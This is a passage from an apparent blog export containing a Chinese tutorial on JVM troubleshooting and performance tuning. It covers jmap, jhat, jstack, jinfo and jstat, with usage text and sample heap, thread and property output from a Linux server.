      <tags>
        <tag>flutter</tag>
      </tags>
  </entry>
  <entry>
    <title>JVM故障诊断和性能调优</title>
    <url>/2019/03/01/java/jvm/JVM%E6%95%85%E9%9A%9C%E8%AF%8A%E6%96%AD%E5%92%8C%E6%80%A7%E8%83%BD%E8%B0%83%E4%BC%98/</url>
    <content><![CDATA[<p>jdk 安装的时候内置了很多命令工具,如下图所示<br><img src="/2019/03/01/java/jvm/JVM故障诊断和性能调优/jvm_20190227153301.png" alt></p>
<a id="more"></a>
<h1 id="jmap"><a href="#jmap" class="headerlink" title="jmap"></a>jmap</h1><p>jmap 主要是输出 jvm 的内存分配信息。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># jmap</span></span><br><span class="line">Usage:</span><br><span class="line">    jmap [option] &lt;pid&gt;</span><br><span class="line">        (to connect to running process)</span><br><span class="line">    jmap [option] &lt;executable &lt;core&gt;</span><br><span class="line">        (to connect to a core file)</span><br><span class="line">    jmap [option] [server_id@]&lt;remote server IP or hostname&gt;</span><br><span class="line">        (to connect to remote debug server)</span><br><span class="line"></span><br><span class="line"><span class="built_in">where</span> &lt;option&gt; is one of:</span><br><span class="line">    &lt;none&gt;               to <span class="built_in">print</span> same info as Solaris pmap</span><br><span class="line">    -heap                to <span class="built_in">print</span> java heap summary</span><br><span class="line">    -histo[:live]        to <span class="built_in">print</span> histogram of java object heap; <span class="keyword">if</span> the <span class="string">"live"</span></span><br><span class="line">                         suboption is specified, only count live objects</span><br><span class="line">    -clstats             to <span class="built_in">print</span> class loader statistics</span><br><span class="line">    -finalizerinfo       to <span class="built_in">print</span> information on objects awaiting finalization</span><br><span class="line">    -dump:&lt;dump-options&gt; to dump java heap <span class="keyword">in</span> hprof binary format</span><br><span class="line">                         dump-options:</span><br><span class="line">                           live         dump only live objects; <span class="keyword">if</span> not specified,</span><br><span class="line">                                        all objects <span class="keyword">in</span> the heap are dumped.</span><br><span class="line">                           format=b     binary format</span><br><span class="line">                           file=&lt;file&gt;  dump heap to &lt;file&gt;</span><br><span class="line">                         Example: jmap -dump:live,format=b,file=heap.bin &lt;pid&gt;</span><br><span class="line">    -F                   force. Use with -dump:&lt;dump-options&gt; &lt;pid&gt; or -histo</span><br><span class="line">                         to force a heap dump or histogram when &lt;pid&gt; does not</span><br><span class="line">                         respond. The <span class="string">"live"</span> suboption is not supported</span><br><span class="line">                         <span class="keyword">in</span> this mode.</span><br><span class="line">    -h | -<span class="built_in">help</span>           to <span class="built_in">print</span> this <span class="built_in">help</span> message</span><br><span class="line">    -J&lt;flag&gt;             to pass &lt;flag&gt; directly to the runtime system</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># jmap -heap 912</span></span><br><span class="line">Attaching to process ID 912, please <span class="built_in">wait</span>...</span><br><span class="line">Debugger attached successfully.</span><br><span class="line">Server compiler detected.</span><br><span class="line">JVM version is 25.171-b11</span><br><span class="line"></span><br><span class="line">using thread-local object allocation.</span><br><span class="line">Mark Sweep Compact GC</span><br><span class="line"></span><br><span class="line">Heap Configuration:</span><br><span class="line">   MinHeapFreeRatio         = 40</span><br><span class="line">   MaxHeapFreeRatio         = 70</span><br><span class="line">   MaxHeapSize              = 1073741824 (1024.0MB)</span><br><span class="line">   NewSize                  = 178913280 (170.625MB)</span><br><span class="line">   MaxNewSize               = 357892096 (341.3125MB)</span><br><span class="line">   OldSize                  = 357957632 (341.375MB)</span><br><span class="line">   NewRatio                 = 2</span><br><span class="line">   SurvivorRatio            = 8</span><br><span class="line">   MetaspaceSize            = 21807104 (20.796875MB)</span><br><span class="line">   CompressedClassSpaceSize = 1073741824 (1024.0MB)</span><br><span class="line">   MaxMetaspaceSize         = 17592186044415 MB</span><br><span class="line">   G1HeapRegionSize         = 0 (0.0MB)</span><br><span class="line"></span><br><span class="line">Heap Usage:</span><br><span class="line">New Generation (Eden + 1 Survivor Space):</span><br><span class="line">   capacity = 161153024 (153.6875MB)</span><br><span class="line">   used     = 2965600 (2.828216552734375MB)</span><br><span class="line">   free     = 158187424 (150.85928344726562MB)</span><br><span class="line">   1.8402385052358683% used</span><br><span class="line">Eden Space:</span><br><span class="line">   capacity = 143261696 (136.625MB)</span><br><span class="line">   used     = 2869664 (2.736724853515625MB)</span><br><span class="line">   free     = 140392032 (133.88827514648438MB)</span><br><span class="line">   2.003092299005032% used</span><br><span class="line">From Space:</span><br><span class="line">   capacity = 17891328 (17.0625MB)</span><br><span class="line">   used     = 95936 (0.09149169921875MB)</span><br><span class="line">   free     = 17795392 (16.97100830078125MB)</span><br><span class="line">   0.536215086996337% used</span><br><span class="line">To Space:</span><br><span class="line">   capacity = 17891328 (17.0625MB)</span><br><span class="line">   used     = 0 (0.0MB)</span><br><span class="line">   free     = 17891328 (17.0625MB)</span><br><span class="line">   0.0% used</span><br><span class="line">tenured generation:</span><br><span class="line">   capacity = 357957632 (341.375MB)</span><br><span class="line">   used     = 65830848 (62.78118896484375MB)</span><br><span class="line">   free     = 292126784 (278.59381103515625MB)</span><br><span class="line">   18.39068149830648% used</span><br><span class="line"></span><br><span class="line">34389 interned Strings occupying 4043536 bytes.</span><br></pre></td></tr></table></figure>
<p>可以看到新生代、老年代、from、to 区域内存大小,使用比例等信息。</p>
<p>jmap 生成堆栈文件,可以用 jvisualvm,MAT 来查看。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost opt]<span class="comment"># jmap -dump:format=b,file=/opt/tyty.dmp 912</span></span><br><span class="line">Dumping heap to /opt/tyty.dmp ...</span><br><span class="line">Heap dump file created</span><br></pre></td></tr></table></figure>
<p>jmap -histo:live 打印存活对象的堆信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># jmap -histo:live 4803|more</span></span><br><span class="line"></span><br><span class="line"> num     <span class="comment">#instances         #bytes  class name</span></span><br><span class="line">----------------------------------------------</span><br><span class="line">   1:        241408       19711856  [C</span><br><span class="line">   2:          6376        6575832  [B</span><br><span class="line">   3:        239513        5748312  java.lang.String</span><br><span class="line">   4:         60783        5348904  java.lang.reflect.Method</span><br><span class="line">   5:         46181        3325032  com.platform.entity.SysRegionEntity</span><br><span class="line">   6:         88804        2841728  java.util.concurrent.ConcurrentHashMap<span class="variable">$Node</span></span><br><span class="line">   7:        139099        2225584  java.lang.Integer</span><br><span class="line">   8:          6272        1746832  [I</span><br><span class="line">   9:         26527        1658824  [Ljava.lang.Object;</span><br><span class="line">  10:         13734        1571192  java.lang.Class</span><br><span class="line">  11:         33734        1349360  java.util.LinkedHashMap<span class="variable">$Entry</span></span><br><span class="line">  12:         36504        1168128  java.util.HashMap<span class="variable">$Node</span></span><br><span class="line">  13:         14199        1065040  [Ljava.util.HashMap<span class="variable">$Node</span>;</span><br><span class="line">  14:         17774         995344  java.util.LinkedHashMap</span><br><span class="line">  15:           768         834944  [Ljava.util.concurrent.ConcurrentHashMap<span class="variable">$Node</span>;</span><br><span class="line">  16:         22656         724992  java.lang.ref.WeakReference</span><br><span class="line">  17:         30572         674312  [Ljava.lang.Class;</span><br><span class="line">  18:         12764         612672  org.aspectj.weaver.reflect.ShadowMatchImpl</span><br><span class="line">  19:         24666         591984  java.util.ArrayList</span><br><span class="line">  20:         21486         515664  org.springframework.core.MethodClassKey</span><br><span class="line">  21:         14789         455880  [Ljava.lang.String;</span><br><span class="line">  22:         12764         408448  org.aspectj.weaver.patterns.ExposedState</span><br><span class="line">--More--</span><br></pre></td></tr></table></figure>
<p>class name 是对象类型，说明如下：</p>
<font color="red">
B byte
C char
D double
F float
I int
J long
Z boolean
[ 数组，如[I 表示 int[]L+类名 其他对象
</font>

<h1 id="jhat"><a href="#jhat" class="headerlink" title="jhat"></a>jhat</h1><p>jhat 分析 jmap 生成的堆栈文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost opt]<span class="comment"># jhat tyty.dmp</span></span><br><span class="line">Reading from tyty.dmp...</span><br><span class="line">Dump file created Wed Feb 27 16:45:13 CST 2019</span><br><span class="line">Snapshot <span class="built_in">read</span>, resolving...</span><br><span class="line">Resolving 2250009 objects...</span><br><span class="line">Chasing references, expect 450 dots..................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">Eliminating duplicate references..................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">Snapshot resolved.</span><br><span class="line">Started HTTP server on port 7000</span><br><span class="line">Server is ready.</span><br></pre></td></tr></table></figure>
<p>浏览器访问 IP:7000 即可看到类的信息.<br><img src="/2019/03/01/java/jvm/JVM故障诊断和性能调优/OQL_20190227165615.png" alt></p>
<h2 id="随意点击一个-class"><a href="#随意点击一个-class" class="headerlink" title="随意点击一个 class"></a>随意点击一个 class</h2><p>点击对应的 class 即可看到<br><img src="/2019/03/01/java/jvm/JVM故障诊断和性能调优/OQL_class_detail.png" alt><br>该页面主要包含了该类的父类、子类信息、类加载器、GC ROOT 引用链信息和从当前对象开始所有可达的对象信息。</p>
<h2 id="主要看下面几个入口信息"><a href="#主要看下面几个入口信息" class="headerlink" title="主要看下面几个入口信息"></a>主要看下面几个入口信息</h2><p><img src="/2019/03/01/java/jvm/JVM故障诊断和性能调优/JHAT_20190227182850.png" alt></p>
<h3 id="All-classes-including-platform"><a href="#All-classes-including-platform" class="headerlink" title="All classes including platform"></a>All classes including platform</h3><p>查看所有类的信息</p>
<h3 id="Show-all-members-of-the-rootset"><a href="#Show-all-members-of-the-rootset" class="headerlink" title="Show all members of the rootset"></a>Show all members of the rootset</h3><p>GC roots 下的所有引用的 class 信息</p>
<h3 id="Show-instance-counts-for-all-classes-including-platform"><a href="#Show-instance-counts-for-all-classes-including-platform" class="headerlink" title="Show instance counts for all classes (including platform)"></a>Show instance counts for all classes (including platform)</h3><p>所有的实例对象信息,某一个对象创建的个数和占用的空间.(包含 JDK 的类信息)</p>
<h3 id="Show-instance-counts-for-all-classes-excluding-platform"><a href="#Show-instance-counts-for-all-classes-excluding-platform" class="headerlink" title="Show instance counts for all classes (excluding platform)"></a>Show instance counts for all classes (excluding platform)</h3><p>所有的实例对象信息,某一个对象创建的个数和占用的空间.(不包含 JDK 的类信息)</p>
<h3 id="Show-heap-histogram"><a href="#Show-heap-histogram" class="headerlink" title="Show heap histogram"></a>Show heap histogram</h3><h3 id="Show-finalizer-summary"><a href="#Show-finalizer-summary" class="headerlink" title="Show finalizer summary"></a>Show finalizer summary</h3><p>GC 回收的信息</p>
<h3 id="Execute-Object-Query-Language-OQL-query"><a href="#Execute-Object-Query-Language-OQL-query" class="headerlink" title="Execute Object Query Language (OQL) query"></a>Execute Object Query Language (OQL) query</h3><p>对象查询语言,可以获取对象的一些信息。不过多介绍，具体参考文章末尾的参考资料信息。</p>
<h1 id="jstack"><a href="#jstack" class="headerlink" title="jstack"></a>jstack</h1><p>jstack 主要是输出 jvm 的栈信息。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># jstack</span></span><br><span class="line">Usage:</span><br><span class="line">    jstack [-l] &lt;pid&gt;</span><br><span class="line">        (to connect to running process)</span><br><span class="line">    jstack -F [-m] [-l] &lt;pid&gt;</span><br><span class="line">        (to connect to a hung process)</span><br><span class="line">    jstack [-m] [-l] &lt;executable&gt; &lt;core&gt;</span><br><span class="line">        (to connect to a core file)</span><br><span class="line">    jstack [-m] [-l] [server_id@]&lt;remote server IP or hostname&gt;</span><br><span class="line">        (to connect to a remote debug server)</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">    -F  to force a thread dump. Use when jstack &lt;pid&gt; does not respond (process is hung)</span><br><span class="line">    -m  to <span class="built_in">print</span> both java and native frames (mixed mode)</span><br><span class="line">    -l  long listing. Prints additional information about locks</span><br><span class="line">    -h or -<span class="built_in">help</span> to <span class="built_in">print</span> this <span class="built_in">help</span> message</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># jstack 912</span></span><br><span class="line">2019-02-27 15:18:38</span><br><span class="line">Full thread dump Java HotSpot(TM) 64-Bit Server VM (25.171-b11 mixed mode):</span><br><span class="line"></span><br><span class="line"><span class="string">"Attach Listener"</span> <span class="comment">#89 daemon prio=9 os_prio=0 tid=0x00007f0411464800 nid=0x24c0 waiting on condition [0x0000000000000000]</span></span><br><span class="line">   java.lang.Thread.State: RUNNABLE</span><br><span class="line"></span><br><span class="line"><span class="string">"http-nio-8084-exec-45"</span> <span class="comment">#88 daemon prio=5 os_prio=0 tid=0x00007f0410ba0800 nid=0x195 waiting on condition [0x00007f03fe3dc000]</span></span><br><span class="line">   java.lang.Thread.State: WAITING (parking)</span><br><span class="line">	at sun.misc.Unsafe.park(Native Method)</span><br><span class="line">	- parking to <span class="built_in">wait</span> <span class="keyword">for</span>  &lt;0x00000000d71bdf78&gt; (a java.util.concurrent.locks.AbstractQueuedSynchronizer<span class="variable">$ConditionObject</span>)</span><br><span class="line">	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)</span><br><span class="line">	at java.util.concurrent.locks.AbstractQueuedSynchronizer<span class="variable">$ConditionObject</span>.await(AbstractQueuedSynchronizer.java:2039)</span><br><span class="line">	at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442)</span><br><span class="line">	at org.apache.tomcat.util.threads.TaskQueue.take(TaskQueue.java:103)</span><br><span class="line">	at org.apache.tomcat.util.threads.TaskQueue.take(TaskQueue.java:31)</span><br><span class="line">	at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1074)</span><br><span class="line">	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1134)</span><br><span class="line">	at java.util.concurrent.ThreadPoolExecutor<span class="variable">$Worker</span>.run(ThreadPoolExecutor.java:624)</span><br><span class="line">	at org.apache.tomcat.util.threads.TaskThread<span class="variable">$WrappingRunnable</span>.run(TaskThread.java:61)</span><br><span class="line">	at java.lang.Thread.run(Thread.java:748)</span><br><span class="line"></span><br><span class="line"><span class="string">"Thread-7"</span> <span class="comment">#41 daemon prio=5 os_prio=0 tid=0x00007f040c07e000 nid=0x11be waiting on condition [0x00007f0404fe8000]</span></span><br><span class="line">   java.lang.Thread.State: WAITING (parking)</span><br><span class="line">	at sun.misc.Unsafe.park(Native Method)</span><br><span class="line">	- parking to <span class="built_in">wait</span> <span class="keyword">for</span>  &lt;0x00000000d7467db8&gt; (a java.util.concurrent.locks.AbstractQueuedSynchronizer<span class="variable">$ConditionObject</span>)</span><br><span class="line">	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)</span><br><span class="line">	at java.util.concurrent.locks.AbstractQueuedSynchronizer<span class="variable">$ConditionObject</span>.await(AbstractQueuedSynchronizer.java:2039)</span><br><span class="line">	at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442)</span><br><span class="line">	at org.LatencyUtils.PauseDetector<span class="variable">$PauseDetectorThread</span>.run(PauseDetector.java:85)</span><br><span class="line"></span><br><span class="line"><span class="string">"lettuce-nioEventLoop-4-1"</span> <span class="comment">#40 daemon prio=5 os_prio=0 tid=0x0000000001c34000 nid=0x11bd runnable [0x00007f04050e9000]</span></span><br><span class="line">   java.lang.Thread.State: RUNNABLE</span><br><span class="line">	at sun.nio.ch.EPollArrayWrapper.epollWait(Native Method)</span><br><span class="line">	at sun.nio.ch.EPollArrayWrapper.poll(EPollArrayWrapper.java:269)</span><br><span class="line">	at sun.nio.ch.EPollSelectorImpl.doSelect(EPollSelectorImpl.java:93)</span><br><span class="line">	at sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:86)</span><br><span class="line">	- locked &lt;0x00000000d7467ff8&gt; (a io.netty.channel.nio.SelectedSelectionKeySet)</span><br><span class="line">	- locked &lt;0x00000000d7467fe8&gt; (a java.util.Collections<span class="variable">$UnmodifiableSet</span>)</span><br><span class="line">	- locked &lt;0x00000000d7468010&gt; (a sun.nio.ch.EPollSelectorImpl)</span><br><span class="line">	at sun.nio.ch.SelectorImpl.select(SelectorImpl.java:97)</span><br><span class="line">	at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)</span><br><span class="line">	at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:753)</span><br><span class="line">	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:409)</span><br><span class="line">	at io.netty.util.concurrent.SingleThreadEventExecutor<span class="variable">$5</span>.run(SingleThreadEventExecutor.java:884)</span><br><span class="line">	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)</span><br><span class="line">	at java.lang.Thread.run(Thread.java:748)</span><br><span class="line"></span><br><span class="line"><span class="string">"Druid-ConnectionPool-Create-1478196796"</span> <span class="comment">#37 daemon prio=5 os_prio=0 tid=0x00007f0400024800 nid=0x3cc waiting on condition [0x00007f0428ffe000]</span></span><br><span class="line">   java.lang.Thread.State: WAITING (parking)</span><br><span class="line">	at sun.misc.Unsafe.park(Native Method)</span><br><span class="line">	- parking to <span class="built_in">wait</span> <span class="keyword">for</span>  &lt;0x00000000d6713938&gt; (a java.util.concurrent.locks.AbstractQueuedSynchronizer<span class="variable">$ConditionObject</span>)</span><br><span class="line">	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)</span><br><span class="line">	at java.util.concurrent.locks.AbstractQueuedSynchronizer<span class="variable">$ConditionObject</span>.await(AbstractQueuedSynchronizer.java:2039)</span><br><span class="line">	at com.alibaba.druid.pool.DruidDataSource<span class="variable">$CreateConnectionThread</span>.run(DruidDataSource.java:2059)</span><br><span class="line"></span><br><span class="line"><span class="string">"Abandoned connection cleanup thread"</span> <span class="comment">#36 daemon prio=5 os_prio=0 tid=0x00007f0400154000 nid=0x3ca in Object.wait() [0x00007f04281b3000]</span></span><br><span class="line">   java.lang.Thread.State: TIMED_WAITING (on object monitor)</span><br><span class="line">	at java.lang.Object.wait(Native Method)</span><br><span class="line">	at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:143)</span><br><span class="line">	- locked &lt;0x00000000d71bd738&gt; (a java.lang.ref.ReferenceQueue<span class="variable">$Lock</span>)</span><br><span class="line">	at com.mysql.jdbc.AbandonedConnectionCleanupThread.run(AbandonedConnectionCleanupThread.java:64)</span><br><span class="line">	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)</span><br><span class="line">	at java.util.concurrent.ThreadPoolExecutor<span class="variable">$Worker</span>.run(ThreadPoolExecutor.java:624)</span><br><span class="line">	at java.lang.Thread.run(Thread.java:748)</span><br><span class="line"></span><br><span class="line"><span class="string">"DestroyJavaVM"</span> <span class="comment">#35 prio=5 os_prio=0 tid=0x00007f0438009000 nid=0x393 waiting on condition [0x0000000000000000]</span></span><br><span class="line">   java.lang.Thread.State: RUNNABLE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">"C2 CompilerThread0"</span> <span class="comment">#5 daemon prio=9 os_prio=0 tid=0x00007f04380d5800 nid=0x398 waiting on condition [0x0000000000000000]</span></span><br><span class="line">   java.lang.Thread.State: RUNNABLE</span><br><span class="line"></span><br><span class="line"><span class="string">"Signal Dispatcher"</span> <span class="comment">#4 daemon prio=9 os_prio=0 tid=0x00007f04380d4000 nid=0x397 runnable [0x0000000000000000]</span></span><br><span class="line">   java.lang.Thread.State: RUNNABLE</span><br><span class="line"></span><br><span class="line"><span class="string">"Finalizer"</span> <span class="comment">#3 daemon prio=8 os_prio=0 tid=0x00007f04380a1000 nid=0x396 in Object.wait() [0x00007f043c897000]</span></span><br><span class="line">   java.lang.Thread.State: WAITING (on object monitor)</span><br><span class="line">	at java.lang.Object.wait(Native Method)</span><br><span class="line">	at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:143)</span><br><span class="line">	- locked &lt;0x00000000d56578d8&gt; (a java.lang.ref.ReferenceQueue<span class="variable">$Lock</span>)</span><br><span class="line">	at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:164)</span><br><span class="line">	at java.lang.ref.Finalizer<span class="variable">$FinalizerThread</span>.run(Finalizer.java:212)</span><br><span class="line"></span><br><span class="line"><span class="string">"Reference Handler"</span> <span class="comment">#2 daemon prio=10 os_prio=0 tid=0x00007f043809c800 nid=0x395 in Object.wait() [0x00007f043c998000]</span></span><br><span class="line">   java.lang.Thread.State: WAITING (on object monitor)</span><br><span class="line">	at java.lang.Object.wait(Native Method)</span><br><span class="line">	at java.lang.Object.wait(Object.java:502)</span><br><span class="line">	at java.lang.ref.Reference.tryHandlePending(Reference.java:191)</span><br><span class="line">	- locked &lt;0x00000000d5657a90&gt; (a java.lang.ref.Reference<span class="variable">$Lock</span>)</span><br><span class="line">	at java.lang.ref.Reference<span class="variable">$ReferenceHandler</span>.run(Reference.java:153)</span><br><span class="line"></span><br><span class="line"><span class="string">"VM Thread"</span> os_prio=0 tid=0x00007f0438095000 nid=0x394 runnable</span><br><span class="line"></span><br><span class="line"><span class="string">"VM Periodic Task Thread"</span> os_prio=0 tid=0x00007f04380e0000 nid=0x39b waiting on condition</span><br><span class="line"></span><br><span class="line">JNI global references: 1495</span><br></pre></td></tr></table></figure>
<p>主要是一些线程的状态信息,可用来检测定位死锁问题。</p>
<h1 id="jinfo"><a href="#jinfo" class="headerlink" title="jinfo"></a>jinfo</h1><p>jinfo 主要是输出系统和 JVM 的参数信息。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># jinfo</span></span><br><span class="line">Usage:</span><br><span class="line">    jinfo [option] &lt;pid&gt;</span><br><span class="line">        (to connect to running process)</span><br><span class="line">    jinfo [option] &lt;executable &lt;core&gt;</span><br><span class="line">        (to connect to a core file)</span><br><span class="line">    jinfo [option] [server_id@]&lt;remote server IP or hostname&gt;</span><br><span class="line">        (to connect to remote debug server)</span><br><span class="line"></span><br><span class="line"><span class="built_in">where</span> &lt;option&gt; is one of:</span><br><span class="line">    -flag &lt;name&gt;         to <span class="built_in">print</span> the value of the named VM flag</span><br><span class="line">    -flag [+|-]&lt;name&gt;    to <span class="built_in">enable</span> or <span class="built_in">disable</span> the named VM flag</span><br><span class="line">    -flag &lt;name&gt;=&lt;value&gt; to <span class="built_in">set</span> the named VM flag to the given value</span><br><span class="line">    -flags               to <span class="built_in">print</span> VM flags</span><br><span class="line">    -sysprops            to <span class="built_in">print</span> Java system properties</span><br><span class="line">    &lt;no option&gt;          to <span class="built_in">print</span> both of the above</span><br><span class="line">    -h | -<span class="built_in">help</span>           to <span class="built_in">print</span> this <span class="built_in">help</span> message</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment"># jinfo 912</span></span><br><span class="line">Attaching to process ID 912, please <span class="built_in">wait</span>...</span><br><span class="line">Debugger attached successfully.</span><br><span class="line">Server compiler detected.</span><br><span class="line">JVM version is 25.171-b11</span><br><span class="line">Java System Properties:</span><br><span class="line"></span><br><span class="line">java.runtime.name = Java(TM) SE Runtime Environment</span><br><span class="line">java.vm.version = 25.171-b11</span><br><span class="line">sun.boot.library.path = /usr/java/jdk1.8.0_171-amd64/jre/lib/amd64</span><br><span class="line">java.protocol.handler.pkgs = org.springframework.boot.loader</span><br><span class="line">java.vendor.url = http://java.oracle.com/</span><br><span class="line">java.vm.vendor = Oracle Corporation</span><br><span class="line">path.separator = :</span><br><span class="line">file.encoding.pkg = sun.io</span><br><span class="line">java.vm.name = Java HotSpot(TM) 64-Bit Server VM</span><br><span class="line">sun.os.patch.level = unknown</span><br><span class="line">sun.java.launcher = SUN_STANDARD</span><br><span class="line">user.country = US</span><br><span class="line">user.dir = /data/bj/devops/tyty</span><br><span class="line">java.vm.specification.name = Java Virtual Machine Specification</span><br><span class="line">PID = 912</span><br><span class="line">java.runtime.version = 1.8.0_171-b11</span><br><span class="line">java.awt.graphicsenv = sun.awt.X11GraphicsEnvironment</span><br><span class="line">os.arch = amd64</span><br><span class="line">java.endorsed.dirs = /usr/java/jdk1.8.0_171-amd64/jre/lib/endorsed</span><br><span class="line">line.separator =</span><br><span class="line"></span><br><span class="line">java.io.tmpdir = /tmp</span><br><span class="line">java.vm.specification.vendor = Oracle Corporation</span><br><span class="line">os.name = Linux</span><br><span class="line">sun.jnu.encoding = UTF-8</span><br><span class="line">java.library.path = /usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib</span><br><span class="line">spring.beaninfo.ignore = <span class="literal">true</span></span><br><span class="line">sun.nio.ch.bugLevel =</span><br><span class="line">java.specification.name = Java Platform API Specification</span><br><span class="line">java.class.version = 52.0</span><br><span class="line">sun.management.compiler = HotSpot 64-Bit Tiered Compilers</span><br><span class="line">os.version = 3.10.0-693.el7.x86_64</span><br><span class="line">user.home = /root</span><br><span class="line">user.timezone = Asia/Shanghai</span><br><span class="line">catalina.useNaming = <span class="literal">false</span></span><br><span class="line">java.awt.printerjob = sun.print.PSPrinterJob</span><br><span class="line">file.encoding = UTF-8</span><br><span class="line">java.specification.version = 1.8</span><br><span class="line">catalina.home = /tmp/tomcat.2534035305981805332.8084</span><br><span class="line">user.name = root</span><br><span class="line">java.class.path = /data/bj/tyty-0.0.1-SNAPSHOT.jar</span><br><span class="line">java.vm.specification.version = 1.8</span><br><span class="line">sun.arch.data.model = 64</span><br><span class="line">sun.java.command = /data/bj/tyty-0.0.1-SNAPSHOT.jar</span><br><span class="line">java.home = /usr/java/jdk1.8.0_171-amd64/jre</span><br><span class="line">user.language = en</span><br><span class="line">java.specification.vendor = Oracle Corporation</span><br><span class="line">awt.toolkit = sun.awt.X11.XToolkit</span><br><span class="line">java.vm.info = mixed mode</span><br><span class="line">java.version = 1.8.0_171</span><br><span class="line">java.ext.dirs = /usr/java/jdk1.8.0_171-amd64/jre/lib/ext:/usr/java/packages/lib/ext</span><br><span class="line">sun.boot.class.path = /usr/java/jdk1.8.0_171-amd64/jre/lib/resources.jar:/usr/java/jdk1.8.0_171-amd64/jre/lib/rt.jar:/usr/java/jdk1.8.0_171-amd64/jre/lib/sunrsasign.jar:/usr/java/jdk1.8.0_171-amd64/jre/lib/jsse.jar:/usr/java/jdk1.8.0_171-amd64/jre/lib/jce.jar:/usr/java/jdk1.8.0_171-amd64/jre/lib/charsets.jar:/usr/java/jdk1.8.0_171-amd64/jre/lib/jfr.jar:/usr/java/jdk1.8.0_171-amd64/jre/classes</span><br><span class="line">java.awt.headless = <span class="literal">true</span></span><br><span class="line">java.vendor = Oracle Corporation</span><br><span class="line">catalina.base = /tmp/tomcat.2534035305981805332.8084</span><br><span class="line">file.separator = /</span><br><span class="line">java.vendor.url.bug = http://bugreport.sun.com/bugreport/</span><br><span class="line">sun.io.unicode.encoding = UnicodeLittle</span><br><span class="line">sun.cpu.endian = little</span><br><span class="line">sun.cpu.isalist =</span><br><span class="line"></span><br><span class="line">VM Flags:</span><br><span class="line">Non-default VM flags: -XX:CICompilerCount=2 -XX:InitialHeapSize=536870912 -XX:MaxHeapSize=1073741824 -XX:MaxNewSize=357892096 -XX:MinHeapDeltaBytes=196608 -XX:NewSize=178913280 -XX:OldSize=357957632 -XX:+UseCompressedClassPointers -XX:+UseCompressedOops</span><br><span class="line">Command line:  -Xms512m -Xmx1024m</span><br></pre></td></tr></table></figure>
<h1 id="jstat"><a href="#jstat" class="headerlink" title="jstat"></a>jstat</h1><p>jvm 统计信息.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># jstat</span></span><br><span class="line">invalid argument count</span><br><span class="line">Usage: jstat -<span class="built_in">help</span>|-options</span><br><span class="line">       jstat -&lt;option&gt; [-t] [-h&lt;lines&gt;] &lt;vmid&gt; [&lt;interval&gt; [&lt;count&gt;]]</span><br><span class="line"></span><br><span class="line">Definitions:</span><br><span class="line">  &lt;option&gt;      An option reported by the -options option</span><br><span class="line">  &lt;vmid&gt;        Virtual Machine Identifier. A vmid takes the following form:</span><br><span class="line">                     &lt;lvmid&gt;[@&lt;hostname&gt;[:&lt;port&gt;]]</span><br><span class="line">                Where &lt;lvmid&gt; is the <span class="built_in">local</span> vm identifier <span class="keyword">for</span> the target</span><br><span class="line">                Java virtual machine, typically a process id; &lt;hostname&gt; is</span><br><span class="line">                the name of the host running the target Java virtual machine;</span><br><span class="line">                and &lt;port&gt; is the port number <span class="keyword">for</span> the rmiregistry on the</span><br><span class="line">                target host. See the jvmstat documentation <span class="keyword">for</span> a more complete</span><br><span class="line">                description of the Virtual Machine Identifier.</span><br><span class="line">  &lt;lines&gt;       Number of samples between header lines.</span><br><span class="line">  &lt;interval&gt;    Sampling interval. The following forms are allowed:</span><br><span class="line">                    &lt;n&gt;[<span class="string">"ms"</span>|<span class="string">"s"</span>]</span><br><span class="line">                Where &lt;n&gt; is an <span class="built_in">integer</span> and the suffix specifies the units as</span><br><span class="line">                milliseconds(<span class="string">"ms"</span>) or seconds(<span class="string">"s"</span>). The default units are <span class="string">"ms"</span>.</span><br><span class="line">  &lt;count&gt;       Number of samples to take before terminating.</span><br><span class="line">  -J&lt;flag&gt;      Pass &lt;flag&gt; directly to the runtime system.</span><br><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment"># jstat -help</span></span><br><span class="line">Usage: jstat -<span class="built_in">help</span>|-options</span><br><span class="line">       jstat -&lt;option&gt; [-t] [-h&lt;lines&gt;] &lt;vmid&gt; [&lt;interval&gt; [&lt;count&gt;]]</span><br><span class="line"></span><br><span class="line">Definitions:</span><br><span class="line">  